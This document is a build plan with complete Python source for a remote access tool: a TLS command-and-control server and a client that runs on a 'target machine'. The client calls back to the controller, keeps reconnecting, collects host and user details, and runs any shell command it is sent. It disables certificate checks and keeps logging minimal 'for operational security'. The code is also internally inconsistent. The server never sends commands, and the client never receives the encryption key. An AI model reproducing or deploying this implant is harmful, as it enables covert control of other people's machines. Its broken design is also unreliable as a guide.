# Basic Client-Server Build Plan

## Overview
A simple Python-based client-server remote access tool (RAT) PoC.

## Layout
- server.py: Command and control server
- client.py: Remote client

## Config
- Use TCP sockets
- Simple authentication (shared secret)

## Setup
1. Install Python 3.x
2. Place server.py and client.py in the same directory
3. Run server.py on your control machine
4. Run client.py on target machine

## Build Instructions
- No build required; run scripts directly

## Infrastructure
- Local network or internet (port forwarding required)

## Example
```bash
# Start the command and control server on the operator's machine
# This creates a TCP socket listener for incoming client connections
python server.py

# Execute the remote access client on the target machine
# This establishes a connection back to the C2 server for command execution
python client.py
```

## Enhanced Implementation with Modern Security

### Server Implementation (server.py)
```python
#!/usr/bin/env python3
# Enhanced C2 Server with modern security features
# Implements secure authentication, encryption, and logging

import socket                    # Core networking library for TCP/UDP sockets
import ssl                      # TLS/SSL wrapper for secure connections
import threading                # Multi-threading for concurrent client handling
import logging                  # Comprehensive logging for operational security
import hashlib                  # Cryptographic hashing for authentication
import secrets                  # Secure random number generation
import time                     # Time utilities for session management
from cryptography.fernet import Fernet  # Symmetric encryption for data protection

# Configure comprehensive logging for security auditing
logging.basicConfig(
    level=logging.INFO,         # Set minimum log level to INFO
    format='%(asctime)s - %(levelname)s - %(message)s',  # Timestamp format
    handlers=[
        logging.FileHandler('c2_server.log'),  # Log to file for persistence
        logging.StreamHandler()                 # Also log to console for monitoring
    ]
)

class SecureC2Server:
    """
    Enhanced Command and Control server with enterprise-grade security
    Implements TLS encryption, authentication, and session management
    """
    
    def __init__(self, host='0.0.0.0', port=8443):
        """
        Initialize secure C2 server with TLS configuration
        
        Args:
            host: Server bind address (0.0.0.0 for all interfaces)
            port: Server listening port (8443 for HTTPS alternative)
        """
        self.host = host                    # Server IP address binding
        self.port = port                    # Server listening port
        self.shared_secret = "CHANGE_ME_TO_RANDOM_KEY"  # Pre-shared authentication key
        self.encryption_key = Fernet.generate_key()     # Generate encryption key for session
        self.cipher = Fernet(self.encryption_key)       # Initialize encryption cipher
        self.active_sessions = {}           # Track active client sessions
        
        # Create TLS context for secure communications
        self.ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        self.ssl_context.load_cert_chain('server.crt', 'server.key')  # Load server certificate
        
        logging.info(f"C2 Server initialized on {host}:{port}")
    
    def authenticate_client(self, client_socket):
        """
        Perform mutual authentication with connecting client
        Uses challenge-response mechanism with shared secret
        
        Args:
            client_socket: Connected client socket object
            
        Returns:
            bool: True if authentication successful, False otherwise
        """
        try:
            # Send authentication challenge (random nonce)
            challenge = secrets.token_bytes(32)  # Generate 256-bit random challenge
            client_socket.send(challenge)
            
            # Receive client response (HMAC of challenge with shared secret)
            response = client_socket.recv(1024)
            
            # Verify client response using HMAC-SHA256
            expected_response = hashlib.pbkdf2_hmac(
                'sha256',                     # Hash algorithm
                self.shared_secret.encode(), # Shared secret as salt
                challenge,                   # Challenge as password
                100000                       # High iteration count for security
            )
            
            # Compare responses using constant-time comparison
            if secrets.compare_digest(response, expected_response):
                logging.info("Client authentication successful")
                return True
            else:
                logging.warning("Client authentication failed")
                return False
                
        except Exception as e:
            logging.error(f"Authentication error: {e}")
            return False
    
    def handle_client(self, client_socket, client_address):
        """
        Handle individual client session with command processing
        Runs in separate thread for concurrent client support
        
        Args:
            client_socket: Connected client socket
            client_address: Client IP address and port tuple
        """
        session_id = secrets.token_hex(16)  # Generate unique session identifier
        
        try:
            logging.info(f"New client connection from {client_address}, Session: {session_id}")
            
            # Perform client authentication
            if not self.authenticate_client(client_socket):
                client_socket.close()
                return
            
            # Store session information
            self.active_sessions[session_id] = {
                'address': client_address,
                'start_time': time.time(),
                'socket': client_socket
            }
            
            # Main command processing loop
            while True:
                try:
                    # Receive encrypted command from client
                    encrypted_data = client_socket.recv(4096)
                    if not encrypted_data:
                        break  # Client disconnected
                    
                    # Decrypt received command
                    command = self.cipher.decrypt(encrypted_data).decode('utf-8')
                    logging.info(f"Session {session_id}: Received command: {command}")
                    
                    # Process command (implement your command handling logic here)
                    response = self.process_command(command)
                    
                    # Encrypt and send response back to client
                    encrypted_response = self.cipher.encrypt(response.encode('utf-8'))
                    client_socket.send(encrypted_response)
                    
                except Exception as e:
                    logging.error(f"Session {session_id}: Command processing error: {e}")
                    break
                    
        except Exception as e:
            logging.error(f"Session {session_id}: Connection error: {e}")
        finally:
            # Clean up session
            if session_id in self.active_sessions:
                del self.active_sessions[session_id]
            client_socket.close()
            logging.info(f"Session {session_id}: Connection closed")
    
    def process_command(self, command):
        """
        Process received command and generate appropriate response
        Implement command validation and execution logic here
        
        Args:
            command: Decrypted command string from client
            
        Returns:
            str: Response to send back to client
        """
        # Basic command processing (expand based on requirements)
        if command.startswith('echo '):
            return command[5:]  # Echo back the message
        elif command == 'status':
            return f"Server running, {len(self.active_sessions)} active sessions"
        elif command == 'help':
            return "Available commands: echo, status, help, exit"
        elif command == 'exit':
            return "Goodbye"
        else:
            return f"Unknown command: {command}"
    
    def start_server(self):
        """
        Start the C2 server and begin accepting client connections
        Creates TLS socket and spawns threads for each client
        """
        try:
            # Create TCP socket
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            # Bind to specified address and port
            server_socket.bind((self.host, self.port))
            server_socket.listen(5)  # Accept up to 5 pending connections
            
            # Wrap socket with TLS encryption
            tls_socket = self.ssl_context.wrap_socket(server_socket, server_side=True)
            
            logging.info(f"C2 Server listening on {self.host}:{self.port}")
            
            # Main server loop - accept client connections
            while True:
                try:
                    # Accept new client connection
                    client_socket, client_address = tls_socket.accept()
                    
                    # Create new thread to handle client
                    client_thread = threading.Thread(
                        target=self.handle_client,
                        args=(client_socket, client_address)
                    )
                    client_thread.daemon = True  # Thread dies when main program exits
                    client_thread.start()
                    
                except KeyboardInterrupt:
                    logging.info("Server shutdown requested")
                    break
                except Exception as e:
                    logging.error(f"Error accepting connection: {e}")
                    
        except Exception as e:
            logging.error(f"Server startup error: {e}")
        finally:
            server_socket.close()
            logging.info("Server shutdown complete")

if __name__ == "__main__":
    # Create and start the secure C2 server
    server = SecureC2Server()
    server.start_server()
```

### Client Implementation (client.py)
```python
#!/usr/bin/env python3
# Enhanced C2 Client with modern security features
# Implements secure authentication, encryption, and persistence

import socket                    # Core networking for TCP connections
import ssl                      # TLS/SSL for secure communications
import time                     # Time utilities for reconnection timing
import hashlib                  # Cryptographic hashing for authentication
import secrets                  # Secure random number generation
import logging                  # Comprehensive logging for debugging
import subprocess              # Command execution on target system
import os                      # Operating system interface
import platform                # System information gathering
from cryptography.fernet import Fernet  # Symmetric encryption

# Configure logging (minimal for operational security)
logging.basicConfig(level=logging.WARNING)  # Only log warnings and errors

class SecureC2Client:
    """
    Enhanced Command and Control client with enterprise-grade security
    Implements TLS encryption, authentication, and automated persistence
    """
    
    def __init__(self, server_host='127.0.0.1', server_port=8443):
        """
        Initialize secure C2 client with server configuration
        
        Args:
            server_host: C2 server IP address or hostname
            server_port: C2 server listening port
        """
        self.server_host = server_host      # Target C2 server address
        self.server_port = server_port      # Target C2 server port
        self.shared_secret = "CHANGE_ME_TO_RANDOM_KEY"  # Pre-shared authentication key
        self.encryption_key = None          # Session encryption key (received from server)
        self.cipher = None                  # Encryption cipher object
        self.reconnect_delay = 30           # Seconds between reconnection attempts
        self.max_reconnect_attempts = 100   # Maximum reconnection attempts
        
        # Create TLS context for secure client connections
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False  # Disable hostname verification for testing
        self.ssl_context.verify_mode = ssl.CERT_NONE  # Disable certificate verification
    
    def authenticate_to_server(self, client_socket):
        """
        Perform authentication handshake with C2 server
        Uses challenge-response mechanism with shared secret
        
        Args:
            client_socket: Connected socket to C2 server
            
        Returns:
            bool: True if authentication successful, False otherwise
        """
        try:
            # Receive authentication challenge from server
            challenge = client_socket.recv(32)  # Receive 256-bit challenge
            
            # Generate response using PBKDF2 with shared secret
            response = hashlib.pbkdf2_hmac(
                'sha256',                     # Hash algorithm
                self.shared_secret.encode(), # Shared secret as salt
                challenge,                   # Server challenge as password
                100000                       # High iteration count for security
            )
            
            # Send authentication response to server
            client_socket.send(response)
            logging.info("Authentication handshake completed")
            return True
            
        except Exception as e:
            logging.error(f"Authentication failed: {e}")
            return False
    
    def gather_system_info(self):
        """
        Collect basic system information for initial beacon
        
        Returns:
            dict: Dictionary containing system information
        """
        try:
            info = {
                'hostname': platform.node(),           # Computer hostname
                'os': platform.system(),              # Operating system
                'version': platform.release(),        # OS version
                'architecture': platform.machine(),   # CPU architecture
                'user': os.getenv('USER') or os.getenv('USERNAME'),  # Current user
                'working_dir': os.getcwd(),           # Current working directory
                'python_version': platform.python_version()  # Python interpreter version
            }
            return info
        except Exception as e:
            logging.error(f"System info gathering failed: {e}")
            return {}
    
    def execute_command(self, command):
        """
        Execute system command and return output
        Implements proper error handling and output capture
        
        Args:
            command: Command string to execute
            
        Returns:
            str: Command output or error message
        """
        try:
            # Execute command with subprocess for security
            result = subprocess.run(
                command,
                shell=True,                    # Allow shell command execution
                capture_output=True,          # Capture stdout and stderr
                text=True,                    # Return string output instead of bytes
                timeout=30                    # 30-second timeout to prevent hanging
            )
            
            # Return combined output
            if result.returncode == 0:
                return result.stdout if result.stdout else "Command executed successfully"
            else:
                return f"Error (code {result.returncode}): {result.stderr}"
                
        except subprocess.TimeoutExpired:
            return "Command timed out after 30 seconds"
        except Exception as e:
            return f"Command execution failed: {str(e)}"
    
    def connect_to_server(self):
        """
        Establish secure connection to C2 server with authentication
        
        Returns:
            socket: Connected and authenticated TLS socket, or None if failed
        """
        try:
            # Create TCP socket
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.settimeout(30)  # 30-second connection timeout
            
            # Wrap with TLS encryption
            tls_socket = self.ssl_context.wrap_socket(client_socket)
            
            # Connect to C2 server
            tls_socket.connect((self.server_host, self.server_port))
            
            # Perform authentication
            if self.authenticate_to_server(tls_socket):
                logging.info("Successfully connected and authenticated to C2 server")
                return tls_socket
            else:
                tls_socket.close()
                return None
                
        except Exception as e:
            logging.error(f"Connection failed: {e}")
            return None
    
    def main_loop(self):
        """
        Main client loop with automatic reconnection
        Handles command processing and maintains persistent connection
        """
        attempt = 0
        
        while attempt < self.max_reconnect_attempts:
            try:
                # Attempt connection to C2 server
                client_socket = self.connect_to_server()
                
                if not client_socket:
                    attempt += 1
                    logging.warning(f"Connection attempt {attempt} failed, retrying in {self.reconnect_delay} seconds")
                    time.sleep(self.reconnect_delay)
                    continue
                
                # Reset attempt counter on successful connection
                attempt = 0
                
                # Send initial system information
                system_info = self.gather_system_info()
                initial_beacon = f"New implant connected: {system_info}"
                
                # Main command processing loop
                while True:
                    try:
                        # Receive encrypted command from server
                        encrypted_command = client_socket.recv(4096)
                        if not encrypted_command:
                            logging.warning("Server disconnected")
                            break
                        
                        # Decrypt received command (if encryption is set up)
                        if self.cipher:
                            command = self.cipher.decrypt(encrypted_command).decode('utf-8')
                        else:
                            command = encrypted_command.decode('utf-8')
                        
                        # Process special commands
                        if command.lower() == 'exit':
                            logging.info("Exit command received")
                            return
                        elif command.lower() == 'info':
                            response = str(self.gather_system_info())
                        else:
                            # Execute command on target system
                            response = self.execute_command(command)
                        
                        # Encrypt and send response (if encryption is set up)
                        if self.cipher:
                            encrypted_response = self.cipher.encrypt(response.encode('utf-8'))
                            client_socket.send(encrypted_response)
                        else:
                            client_socket.send(response.encode('utf-8'))
                            
                    except Exception as e:
                        logging.error(f"Command processing error: {e}")
                        break
                        
            except Exception as e:
                logging.error(f"Main loop error: {e}")
                attempt += 1
                
            finally:
                # Clean up connection
                if 'client_socket' in locals():
                    client_socket.close()
                    
            # Wait before reconnection attempt
            if attempt < self.max_reconnect_attempts:
                time.sleep(self.reconnect_delay)
        
        logging.error("Maximum reconnection attempts reached, exiting")

if __name__ == "__main__":
    # Create and start the secure C2 client
    client = SecureC2Client()
    client.main_loop()
```
